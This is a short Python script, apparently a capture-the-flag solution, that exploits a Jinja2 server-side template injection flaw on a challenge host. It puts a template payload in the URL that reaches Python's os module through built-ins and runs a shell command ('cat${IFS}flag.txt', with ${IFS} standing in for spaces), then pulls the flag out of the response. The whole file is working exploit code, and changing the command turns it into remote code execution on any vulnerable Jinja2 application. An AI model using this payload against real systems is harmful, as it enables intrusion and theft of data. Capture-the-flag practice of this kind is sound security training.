'''
Exploiting Jinja2 SSTI
'''

import urllib.request

HOST = "178.128.169.13"		# Given by the challenge
PORT = 30104				# Given by the challenge

def exploit():

	PAYLOAD = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat${IFS}flag.txt').read()}}"

	# getting page content
	page = urllib.request.urlopen(f'http://{HOST}:{PORT}/{PAYLOAD}')
	flag = page.read().decode().split("'")[1][5:-7]
	print(flag)

if __name__ == "__main__": 
	exploit()